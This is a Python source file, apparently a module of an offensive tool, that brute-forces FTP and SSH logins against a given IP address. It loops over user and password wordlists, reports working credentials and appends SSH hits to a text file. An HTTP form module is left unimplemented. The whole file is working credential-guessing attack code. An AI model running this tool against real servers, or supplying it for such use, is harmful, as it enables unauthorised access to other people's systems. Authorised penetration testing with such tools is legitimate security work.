import ftplib
import time
import paramiko
import socket

from contextlib import closing
from paramiko.ssh_exception import (
    AuthenticationException,
    SSHException,
    NoValidConnectionsError
)

from utils.print import info, success, warning, error  # ← colores centralizados


def port_open(ip: str, port: int, timeout: float = 3.0) -> bool:
    """Returns True if the port is open, False if it is closed/filtered."""
    try:
        with closing(socket.create_connection((ip, port), timeout)):
            return True
    except OSError:
        return False


def bruteFTP(ip, userlist, passlist, port=21, verbose=False):
    if not port_open(ip, port):
        error(f"❌ {ip}:{port} is not responding on TCP. Is the port correct?")
        return

    with open(userlist) as u, open(passlist) as p:
        users = u.read().splitlines()
        pwds = p.read().splitlines()

    if not users or not pwds:
        error("❌ User or password file is empty.")
        return

    for usr in users:
        for pwd in pwds:
            session = ftplib.FTP()
            try:
                session.connect(ip, port, timeout=5)
                session.login(usr, pwd)
                success(f"✅ Successful login: {usr}:{pwd}")
                session.quit()
                return
            except ftplib.error_perm:
                if verbose:
                    error(f"❌ Failed: {usr}:{pwd}")
            except Exception as e:
                warning(f"⚠️  Error with {usr}:{pwd} -> {e}")
            finally:
                try:
                    session.quit()
                except:
                    pass
            time.sleep(0.2)


def bruteSSH(ip, userlist, passlist, port=22, verbose=False):
    if not port_open(ip, port):
        error(f"❌ {ip}:{port} is not responding on TCP. Is the port correct?")
        return

    with open(userlist) as u, open(passlist) as p:
        users = u.read().splitlines()
        pwds = p.read().splitlines()

    if not users or not pwds:
        error("❌ User or password file is empty.")
        return

    for usr in users:
        for pwd in pwds:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                client.connect(
                    ip,
                    port=port,
                    username=usr,
                    password=pwd,
                    timeout=5,
                    banner_timeout=5,
                    look_for_keys=False,
                    allow_agent=False
                )
                success(f"✅ Successful login: {usr}:{pwd}")
                with open("ssh_hits.txt", "a") as f:
                    f.write(f"{ip}:{port} - {usr}:{pwd}\n")
                client.close()
                return

            except AuthenticationException:
                if verbose:
                    error(f"❌ Failed: {usr}:{pwd}")

            except NoValidConnectionsError:
                error(f"❌ Connection refused on {ip}:{port}. Check the port or firewall.")
                return

            except (socket.timeout, socket.error) as e:
                if verbose:
                    warning(f"⚠️  Error with {usr}:{pwd} -> {e}")

            except SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    error(f"❌ Could not establish SSH connection to {ip}:{port}. Are you using the correct port?")
                    return
                elif verbose:
                    warning(f"⚠️  SSHException with {usr}:{pwd} -> {e}")

            finally:
                try:
                    client.close()
                except:
                    pass

            time.sleep(0.2)

    error("❌ No valid SSH credentials were found.")


def bruteHttpForm():
    warning("🌐 HTTP form module not yet implemented.")


def run(type, ip, userlist, passlist, port=None, verbose=False):
    if type == "ftp":
        bruteFTP(ip, userlist, passlist, port or 21, verbose)
    elif type == "ssh":
        bruteSSH(ip, userlist, passlist, port or 22, verbose)
    elif type == "http":
        bruteHttpForm()
    else:
        error(f"❌ Unrecognized attack type '{type}'.")
